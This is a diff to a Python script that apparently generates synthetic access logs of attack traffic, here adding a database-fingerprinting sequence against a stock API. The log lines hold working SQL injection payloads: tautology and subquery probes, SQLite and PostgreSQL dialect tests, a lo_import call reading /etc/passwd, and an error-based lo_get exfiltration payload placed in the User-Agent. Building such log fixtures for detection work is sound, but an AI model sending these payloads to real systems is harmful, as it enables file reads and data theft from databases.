@@ -788,6 +788,37 @@ def django_orm_probe(ip: str, day: int, hour: int) -> None:
     write(t, ip, "GET /api/users?profile__data__has_key=is_admin HTTP/1.1", 200, 612, agent=CURL)
 
 
+def database_fingerprint(ip: str, day: int, hour: int) -> None:
+    """A tool working out which database answers behind the stock API.
+
+    First the probe every injection starts with, a whole value that is a
+    comparison. Then one dialect at a time: SQLite's GLOB, which nothing but
+    SQLite understands, then PostgreSQL's cast and its large-object calls,
+    which read files off the database host. The 500s are the answer it wanted.
+    The last request moves the payload into the User-Agent, which the shop's
+    analytics stores, and which the access log records in full.
+    """
+    t = at(day, hour)
+    probes = [
+        ("/api/stock?sku=1%3D1", 200, 412),
+        ("/api/stock?sku=1%20in%20(select%201)", 200, 412),
+        ("/api/stock?sku=%27or(id%20glob%201)--", 400, 96),
+        ("/api/stock?sku=password::int", 500, 1_204),
+        ("/api/stock?sku=lo_import(%27/etc/passwd%27)", 500, 1_180),
+    ]
+    for probe, status, size in probes:
+        write(t, ip, f"GET {probe} HTTP/1.1", status, size, agent=CURL)
+        t += timedelta(seconds=5)
+    write(
+        t,
+        ip,
+        "GET /api/stock?sku=4417 HTTP/1.1",
+        500,
+        1_196,
+        agent="encode(lo_get(16400),'base64')::int",
+    )
+
+
 def nosql_and_shellshock(ip: str, day: int, hour: int) -> None:
     """Two old-stack probes that share nothing but this client.
 
@@ -1054,6 +1085,7 @@ def build() -> None:
     java_attacks("192.0.2.118", 0, 20)
     perl_and_node("192.0.2.121", 1, 15)
     django_orm_probe("192.0.2.122", 2, 14)
+    database_fingerprint("192.0.2.123", 0, 15)
     nosql_and_shellshock("192.0.2.119", 2, 4)
     headless_client("192.0.2.120", 1, 11)
 
